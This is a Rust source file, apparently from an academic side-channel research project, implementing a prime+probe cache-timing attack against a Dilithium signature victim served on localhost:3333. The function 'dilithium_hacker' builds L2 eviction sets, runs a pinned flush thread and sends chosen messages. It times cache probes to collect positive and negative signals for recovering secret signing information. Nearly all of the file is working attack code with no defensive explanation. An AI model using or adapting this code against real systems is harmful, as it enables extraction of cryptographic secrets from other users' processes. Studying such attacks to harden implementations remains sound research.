use crypto_attacker::*;
use libaugury_ffi_sys::{c_sleep, pin_cpu, flush_evset};
// std lib
use std::env::args;
use std::str;
use std::mem::size_of;
use std::sync::atomic::Ordering;
use std::sync::atomic::compiler_fence;
use std::net::{TcpStream};
use std::io::{Read, Write};
use std::sync::mpsc::{self, TryRecvError};
use std::thread;
use std::collections::HashMap;
use std::time::Instant;
// file lib
use std::fs::{File, read_to_string};
// mmap lib
use mmap_rs::MmapOptions;
// P+P lib
use evict_rs::timer::Timer;
use evict_rs::MyTimer;
use evict_rs::{eviction_set_gen64,
    prime_with_dependencies, probe_with_dependencies, 
    evset_vec_to_evset, evset_vec_set_offset};
use evict_rs::allocator::Allocator;
use evict_rs::eviction_set::EvictionSet;


fn dilithium_hacker(
    mut stream: TcpStream,
    victim_array_cache_lines: &mut Vec<*mut u8>,
    repetitions: usize,
    pp_threshold: u64,
    num_group: usize,
    flush_ptr: *mut u64,
    victim_page_number: &str,
    pos_times: u64,
    collection_bound: u64,
    hack_time: &str,
    timer: &MyTimer,
    mut bench_time_file: &File
) {
    let mut __trash: u64 = 0;
    let mut test_time: u64;
    let mut msg_data = [0u8; 1];

    // allocate array for message to be signed
    let mut msg_sign: [u8; 8] = [0u8; 8];

    // --------------------------------Calibration-----------------------------
    println!("--------------------------------Calibration-----------------------------");
    // Try different combination of messages / prime+probe set / flush set
    // Global Variable
    let flush_ptr_value: u64 = flush_ptr as u64;  // Start addr of flush array
    let mut global_pp_idx: usize = 0;  // P+P Evset id
    let mut pp_flag = 0;  // P+P page frame discovered flag: 0 (find probe&flush for z), 1 (examine z), 2 (find flush for y), 3 (main attack)
    let mut z_success = 0;  // how many time z success
    let mut global_flush_group_idx = 0;  // Flush Evset id
    let mut test_ptr_idx = 0;  // Ptr location id under test 0~512
    let mut test_msg_idx;  // Message idx under test
    let mut bad_set_map: HashMap<(usize, u64), u64> = HashMap::new();  // Hash Map point to noisy set
    let mut num_cur_col_msg: [u64; 4] = [0u64; 4];  // Number of collected msgs in current 128 ptr positions
    let mut profile_base_vec = vec![]; // store profile result for base
    let mut profile_atk_vec = vec![];  // store profile result for atk

    // Load possible page offsets of victim array
    let mut vbuf_offset_v = vec![];
    let vbuf_offset_str: Vec<String> = read_to_string("dilithium_addr.txt").unwrap().lines().map(String::from).collect();
    println!("[+] Grab page offset of victim array from file...");
    for line in vbuf_offset_str {
        let victim_buf_offset = match u64::from_str_radix(&line[2..], 16) {
            Ok(result) => result & 0x3f80,
            Err(error) => panic!("Fail to parse memory boundary {}", error)
        };
        println!("{:#x}", victim_buf_offset);
        vbuf_offset_v.push(victim_buf_offset);
    }
    let z_offset = vbuf_offset_v[0];
    let y_offset = vbuf_offset_v[1];

    // create flush thread
    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, z_offset as usize, 
        0, NUM_EVSETS/num_group, flush_ptr);
    let (tx, rx) = mpsc::channel();
    let _handle = thread::spawn(move || {
        unsafe{ pin_cpu(5); }
        loop {
            unsafe{ flush_evset(flush_ptr_value as *mut u64, (NUM_EVSETS / num_group * L2_CACHE_WAYS) as u32); }

            match rx.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    match rx.recv() {
                        Ok(_) => {},
                        Err(_) => {break;}
                    }
                },
                Err(TryRecvError::Empty) => {}
            };
        };
    });
    // Stop flush thread
    __trash = match tx.send(__trash) {
        Ok(_) => {unsafe{ c_sleep(0, __trash) }},
        Err(_) => {panic!("Send Error");}
    };
    println!("[+] Flush thread is created!");
    let cevset_now = Instant::now();
    let mut positive_file = File::create("./dilithium_positive_".to_owned()+hack_time+".txt").unwrap();
    let mut negative_file = File::create("./dilithium_negative_".to_owned()+hack_time+".txt").unwrap();

    // Traverse 512 Pointer Position
    while test_ptr_idx < 512 {
        // Fetch z
        let z_file_name: &str = &("../dilithium_data/".to_owned() + victim_page_number + "/dilithium_z/z_" + &test_ptr_idx.to_string() + ".txt");
        let z_str_vec: Vec<String> = read_to_string(z_file_name).unwrap().lines().map(String::from).collect();
        // Fetch Message
        let msg_file_name: &str = &("../dilithium_data/".to_owned() + victim_page_number + "/dilithium_msg/msg_" + &test_ptr_idx.to_string() + ".txt");
        let msg_str_vec: Vec<String> = read_to_string(msg_file_name).unwrap().lines().map(String::from).collect();
        test_msg_idx = 0;
        bad_set_map.clear();  // clean bad set

        // Traverse Message in current position
        while test_msg_idx < msg_str_vec.len() {
            // Parse z
            let z_str = &z_str_vec[test_msg_idx];
            let z_ptr = match u64::from_str_radix(&z_str[2..], 16) {
                Ok(result) => result,
                Err(error) => panic!("Fail to parse y pointer {}", error)
            };
            println!("[+] Pick z {:#x}", z_ptr);
            let probe_page_offset: u64 = z_ptr & 0x3f80;
            // Parse Message
            let msg_str = &msg_str_vec[test_msg_idx];
            println!("[+] Pick message {}", msg_str);
            for (byte_idx, byte_str) in msg_str.split_whitespace().enumerate() {
                let byte_value = match u8::from_str_radix(&byte_str, 10) {
                    Ok(result) => result,
                    Err(error) => panic!("Fail to parse message byte {}", error)
                };
                msg_sign[byte_idx] = byte_value;
            }
            if pp_flag == 0 {
                global_pp_idx = 0;
            }

            // Traverse 64 probes
            while global_pp_idx < 64 {
                // Pick prime+probe channel
                if (bad_set_map.contains_key(&(global_pp_idx, probe_page_offset))) || (probe_page_offset == z_offset) || (probe_page_offset == y_offset) {
                    println!("[+] Target Pointer maps to bad set ({},{:#x}) (size:{})", 
                        global_pp_idx, probe_page_offset, bad_set_map.len());
                    if pp_flag == 0 {
                        global_pp_idx += 1;
                        continue;
                    } else {
                        break;
                    }
                }
                let mut pp_evset_vec_cur: Vec<*mut u8> = Vec::new();
                evset_vec_to_evset(&victim_array_cache_lines, 
                    &mut pp_evset_vec_cur, L2_CACHE_WAYS, probe_page_offset as usize, global_pp_idx);
                assert_eq!(pp_evset_vec_cur.len(), L2_CACHE_WAYS);
                let pp_evset = EvictionSet::new(&mut pp_evset_vec_cur);
                println!("[+] P+P Evset (id {}, offset {:#x}) for msg ({}, {})", 
                    global_pp_idx, probe_page_offset, test_ptr_idx, test_msg_idx);
                // detect probe for z or y need to vary flush group
                if (pp_flag == 0) || (pp_flag == 2) {
                    global_flush_group_idx = 0;
                }

                // Traverse flush group set
                let mut success_times = 0;
                let mut fails_times = 0;
                let mut black_list_times = 0;
                while global_flush_group_idx < num_group {
                    // measure the time elapse for each window loop
                    let now = Instant::now();
                    // chose different page offset of flush evset for different chunks of group
                    if (pp_flag == 0) || (pp_flag == 1) {
                        evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, (z_offset as usize + test_ptr_idx*8) & 0x3f80,
                            global_flush_group_idx % num_group, NUM_EVSETS/num_group, flush_ptr);
                        println!("[+] Group {} {:#x}:", global_flush_group_idx, (z_offset as usize + test_ptr_idx*8) & 0x3f80);
                    } else {
                        evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, (y_offset as usize + test_ptr_idx*8) & 0x3f80,
                            global_flush_group_idx % num_group, NUM_EVSETS/num_group, flush_ptr);
                        println!("[+] Group {} {:#x}:", global_flush_group_idx, (y_offset as usize + test_ptr_idx*8) & 0x3f80);
                    }

                    // Initial vectors to store results
                    let mut times_to_load_test_ptr_base = vec![];
                    let mut times_to_load_test_ptr_atk = vec![];
                    // Initial mode
                    let mut mode: u8 = 0;
                    // Measurement
                    for _ in 0..repetitions*2 {
                        // Message xor 0 or xor 1
                        msg_sign[0] = msg_sign[0] ^ mode;

                        // send request
                        msg_data[0] = !(__trash & MSB_MASK) as u8;
                        stream.write_all(&msg_data).unwrap();
                        
                        // receive pubkey from victim
                        stream.read_exact(&mut msg_data).unwrap();

                        // Resume flush thread
                        __trash = match tx.send(__trash) {
                            Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                            Err(_) => {panic!("Send Error");}
                        };

                        __trash = unsafe{ c_sleep(1500000, __trash)};

                        compiler_fence(Ordering::SeqCst);
                        __trash = prime_with_dependencies(&pp_evset, __trash);
                        msg_sign[0] = msg_sign[0] | (__trash & MSB_MASK) as u8;

                        // send Message
                        stream.write_all(&msg_sign).unwrap();

                        // receive finish signal
                        stream.read_exact(&mut msg_data).unwrap();
                        __trash += msg_data[0] as u64;

                        // Stop flush thread
                        __trash = match tx.send(__trash) {
                            Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                            Err(_) => {panic!("Send Error");}
                        };
                        compiler_fence(Ordering::SeqCst);
            
                        // measure microarchitectural state
                        test_time = probe_with_dependencies(timer, &pp_evset, __trash);
                        __trash = test_time | (__trash & MSB_MASK);

                        // Recover Message (xor again)
                        msg_sign[0] = msg_sign[0] ^ mode;

                        // store result
                        if mode==0 {
                            times_to_load_test_ptr_atk.push(test_time);
                        } else {
                            times_to_load_test_ptr_base.push(test_time);
                        }

                        mode = mode ^ 0x1;
                    }
                    times_to_load_test_ptr_atk.sort();
                    times_to_load_test_ptr_base.sort();
                    let median_test_atk = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
                    let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
                    println!("Attack mode: {}", median_test_atk);
                    println!("Base mode: {}", median_test_base);
                    let trans_dur = now.elapsed();
                    println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
                        trans_dur.subsec_nanos());

                    let mut guess_flag = 0;
                    if (median_test_base < pp_threshold) && ((median_test_atk as i32 - median_test_base as i32 > 70) || 
                        ((median_test_atk as i32 - median_test_base as i32 > 50) && (median_test_atk > pp_threshold))) {
                        guess_flag = 1;
                    } else if median_test_base > pp_threshold {
                        black_list_times += 1;
                        if black_list_times >= 3 {
                            bad_set_map.insert((global_pp_idx, probe_page_offset), 1);
                            println!("[+] Bad Set ({}, {:#x}) add (size: {})", global_pp_idx, probe_page_offset, bad_set_map.len());
                            break;
                        }
                    }
                    if guess_flag == 1 {
                        // Guess -> Positive
                        success_times += 1;
                        fails_times = 0;
                        if success_times >= pos_times {
                            if pp_flag == 0 {
                                // z calibration part
                                println!("[++++] ********Calibration z stage seem to be done!********");
                                pp_flag = 1;
                                break;
                            } else if pp_flag == 1 {
                                z_success += 1;
                                println!("[+] Got z signal {}", z_success);
                                // add profiling
                                profile_base_vec.append(&mut times_to_load_test_ptr_base);
                                profile_atk_vec.append(&mut times_to_load_test_ptr_atk);
                                if z_success >= 3 {
                                    pp_flag = 2;
                                    println!("[++++] ********Calibration z stage done!********");
                                    // write profile result
                                    let mut prof_atk_file = File::create("dilithium_1.txt").unwrap();
                                    let mut prof_base_file = File::create("dilithium_0.txt").unwrap();
                                    for profile_idx in 0..profile_atk_vec.len() {
                                        write!(prof_atk_file, "{}\n", profile_atk_vec[profile_idx]).unwrap();
                                        write!(prof_base_file, "{}\n", profile_base_vec[profile_idx]).unwrap();
                                    }
                                    println!("[+] Storing Profile Result!");
                                }
                                break;
                            } else if pp_flag == 2 {
                                pp_flag = 3;
                                println!("[++++] ********Calibration y stage done!********");
                                num_cur_col_msg[test_ptr_idx / 128] += 1;
                                println!("[+] msg ({}, {}) is valid ({})", test_ptr_idx, test_msg_idx, num_cur_col_msg[test_ptr_idx / 128]);
                                write!(positive_file, "({},{})\n", test_ptr_idx, test_msg_idx).unwrap();
                                write!(bench_time_file, "Compound Evset finding time: {} s\n", cevset_now.elapsed().as_secs()).unwrap();
                                break;
                            } else {
                                num_cur_col_msg[test_ptr_idx / 128] += 1;
                                println!("[+] msg ({}, {}) is valid ({})", test_ptr_idx, test_msg_idx, num_cur_col_msg[test_ptr_idx / 128]);
                                write!(positive_file, "({},{})\n", test_ptr_idx, test_msg_idx).unwrap();
                                break;
                            }
                        }
                    } else {
                        // Guess -> Negative
                        success_times = 0;
                        fails_times += 1;
                        if fails_times >= 3 {
                            fails_times = 0;
                            if (pp_flag == 0) || (pp_flag == 2) {
                                global_flush_group_idx += 1;
                            } else if pp_flag == 1{
                                z_success = 0;
                                profile_base_vec.clear();
                                profile_atk_vec.clear();
                                pp_flag = 0;
                                println!("[++++] ********Miss z signal!*********");
                                break;
                            } else {
                                println!("[+] msg ({}, {}) is invalid ({})", test_ptr_idx, test_msg_idx, num_cur_col_msg[test_ptr_idx / 128]);
                                if black_list_times == 0 {
                                    write!(negative_file, "({},{})\n", test_ptr_idx, test_msg_idx).unwrap();
                                }
                                break;
                            }
                        }
                    }
                }
                if pp_flag == 0 {
                    global_pp_idx += 1;
                } else {
                    break;
                }
            }
            test_msg_idx += 1;
        }
        if num_cur_col_msg[test_ptr_idx / 128] >= collection_bound {
            println!("[++++] ********Get enough msg ({}) for current section!*********", num_cur_col_msg[test_ptr_idx / 128]);
            test_ptr_idx = (test_ptr_idx / 128 + 1) * 128;
        } else {
            test_ptr_idx += 1;
        }
    }
    // disconnect the transaction
    msg_data[0] = (__trash & MSB_MASK) as u8;
    stream.write_all(&msg_data).unwrap();
}


fn main() {
    let repetitions = args().nth(1).expect("Enter <repetitions>");
    let pp_threshold = args().nth(2).expect("Enter <prime+probe channel threshold>");
    let num_group = args().nth(3).expect("Enter <number of flush thread group to try>");
    let victim_page_number = args().nth(4).expect("Enter <victim page number>");
    let pos_times = args().nth(5).expect("Enter <how many times of positive signal can determine the guess>");
    let collection_bound = args().nth(6).expect("Enter <num of collected msg per 128 ptr positions>");
    let hack_time = args().nth(7).expect("Enter <the hack time>");
    let repetitions = repetitions.parse::<usize>().unwrap();
    let pp_threshold = pp_threshold.parse::<u64>().unwrap();
    let num_group = num_group.parse::<usize>().unwrap();
    assert_eq!(NUM_EVSETS % num_group, 0);
    let pos_times = pos_times.parse::<u64>().unwrap();
    let collection_bound = collection_bound.parse::<u64>().unwrap();

    println!("[+] Message to be signed targeting to -> {}", victim_page_number);
    println!("[+] Positive times threshold -> {}", pos_times);
    println!("[+] Collection bound per 128 pointer entries -> {}", collection_bound);

    unsafe{ pin_cpu(4); }

    // Allocate Precise Flush buffer
    let size_of_flush_buf: usize = size_of::<u64>() * (NUM_EVSETS/num_group) * L2_CACHE_WAYS;
    // Allocate via mmap
    let mut flush_buf_addr = MmapOptions::new(size_of_flush_buf)
        .map_mut()
        .unwrap();
    assert_eq!(size_of_flush_buf, flush_buf_addr.len());

    let flush_bytes = unsafe {
        core::slice::from_raw_parts_mut(
            flush_buf_addr.as_mut_ptr() as *mut u8,
            flush_buf_addr.len(),
        )
    };
    flush_bytes.fill(0x00);

    let flush_ptr = flush_buf_addr.as_mut_ptr() as *mut u64;

    // prepare 64 eviction set groups
    let mut bench_time_file = File::create("dilithium_bench.txt").unwrap();
    println!("--------------------------------Evsets Preparation-----------------------------");
    let gen64_now = Instant::now();
    let timer = MyTimer::new();
    let mut victim_array_cache_lines: Vec<*mut u8> = Vec::new();
    let mut allocator = Allocator::new(0, NATIVE_PAGE_SIZE);
    eviction_set_gen64(&mut allocator, &mut victim_array_cache_lines, &timer);
    write!(bench_time_file, "64 evset gen time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();
    match TcpStream::connect("localhost:3333") {
        Ok(stream) => {
            println!("Successfully connected to server in port 3333");
            dilithium_hacker(stream, &mut victim_array_cache_lines, 
                repetitions, pp_threshold, num_group, flush_ptr, 
                &victim_page_number, pos_times, collection_bound, &hack_time, &timer, &bench_time_file);

        },
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
    println!("Terminated.");
    write!(bench_time_file, "Online time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();
}